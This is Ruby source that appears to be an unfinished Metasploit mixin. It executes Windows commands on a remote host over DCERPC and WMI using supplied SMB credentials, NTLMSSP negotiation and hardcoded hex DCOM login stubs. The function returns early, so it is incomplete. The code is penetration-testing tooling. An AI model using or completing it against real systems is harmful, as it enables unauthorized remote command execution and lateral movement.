# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/exploit/dcerpc'

module Msf

####
# 
# http://msdn.microsoft.com/en-us/library/cc250693.aspx
#
####

module Exploit::Remote::DCERPC::Wmis

	# Include SMB First so DCERPC sets the RPORT
	include Exploit::Remote::SMB::Authenticated
	include Msf::Exploit::Remote::DCERPC

	# Executes a single windows command.
	#
	# If you want to retrieve the output of your command you'll have to
	# echo it to a .txt file and then use the {#smb_read_file} method to
	# retrieve it.  Make sure to remove the files manually or use
	# {Exploit::FileDropper#register_files_for_cleanup} to have the
	# {Exploit::FileDropper#cleanup} and
	# {Exploit::FileDropper#on_new_session} handlers do it for you.
	#
	# @todo Figure out the actual exceptions this needs to deal with
	#   instead of all the ghetto "rescue ::Exception" madness
	# @param command [String] Should be a valid windows command
	# @return [Boolean] Whether everything went well
	def wmis(command)
		#ioxidresolver_handle = create_handle('99fcfec4-5260-101b-bbcb-00aa0021347a')
		#vprint_status("#{peer} - Binding to #{handle} ...")
		#dcerpc_bind(ioxidresolver_handle)
		#vprint_status("#{peer} - Bound to #{handle} ...")

		remact_handle = create_handle('4d9f4ab8-7d1c-11cf-861e-0020af6e7c57', datastore['RPORT'])
		auth_type = 9 #spnego
		auth_level = 2 #connect
		dcerpc_bind(remact_handle, auth_type, auth_level)
		opts = {:user => datastore['SMBUser'],
			:password => datastore['SMBPass'],
			:domain => datastore['SMBDomain'],
			:name => datastore['SMBName'],
			}

		ntlm_options = {
                                :signing                => true, 
                                :usentlm2_session       => true,
                                :use_ntlmv2             => false,
                                :send_lm                => true,
                                :send_ntlm              => true,
                                :use_lanman_key         => false
                                }
		if Rex::Text.to_hex(dcerpc.last_response.raw[84..93]) == '\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02'
			auth_type = 10 #ntlmssp
			auth_level = 5 #connect! #packet integrity
			puts "NTLMSSP Authentication"
		else
			raise "Unknown Authentication Mechanism"
		end

		dcerpc.alter_context_auth(opts, ntlm_options)

		iwbemlevel1login = Rex::Text.hex_to_raw("050001000000000000000000a421c0890da66c4c8a1c5c935623cc70000000005ef0c38b6bd8d011a07500c04fb688200000000000000000020000000000000001000000000002000100000018ad09f36ad8d011a07500c04fb68820030000000300000007000f000c00")
		iwbemlevel1login << Rex::Text.hex_to_raw("01000000000000000000000000000000")
		orpcthat =  dcerpc.call(0, iwbemlevel1login) #0 Remote Activation
		uuid, port, ipid  = Rex::Proto::DCERPC::Dcom.parse(orpcthat)

		iwbemlevel1login_handle = create_handle(uuid,port)
		
		dcerpc_bind(iwbemlevel1login_handle, auth_type, auth_level)
		dcerpc.auth(opts, ntlm_options)

		dcerpc.call_auth(6, Rex::Text.hex_to_raw("0500010000000000000000004e238f062fa78a4a9e4a9e6c6514fd9600000000000002000b000000000000000b00000072006f006f0074005c00630069006d007600320000000000000000000000000000000000"), ipid)
		
		return
		stubdata = NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error getting scm handle: #{e}")
			return false
		end
		return true
	end

	def create_handle(uuid, port)
		return Rex::Proto::DCERPC::Handle.new(
			[
				uuid,
				'0.0',
				'8a885d04-1ceb-11c9-9fe8-08002b104860',
				2
			],
			'ncacn_ip_tcp',
			rhost,
			[port]
		)
	end
end	
end

